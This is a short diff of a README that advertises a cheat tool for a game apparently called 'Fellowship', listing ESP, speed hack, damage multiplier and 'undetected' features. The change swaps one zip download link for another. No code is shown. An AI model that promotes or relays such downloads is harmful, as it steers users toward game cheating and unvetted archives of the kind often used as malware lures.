@@ -5,8 +5,7 @@
   <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=42&duration=4500&pause=1200&color=FF4500&center=true&vCenter=true&width=750&lines=FELLOW+SHIP+HACK;OP+INFINITE+KI+2026;ESP+NO+STAMINA;DAMAGE+MULTIPLIER;SPEED+HACK;UNDTECTED+FAST" alt="Typing SVG" />
 </p>
 
-### [DOWNLOAD RELEASE](https://github.com/Bufferpliruminate/fellowship-2026/releases/download/Release/Fellowship.zip)
-(https://github.com/Bufferpliruminate/fellowship-2026/releases/download/Release/Fellowship.zip)
+### [DOWNLOAD RELEASE](https://github.com/Bufferpliruminate/fellowship-2026/releases/download/Fixes/fellowship.zip)
 
 ## Quick Start
 
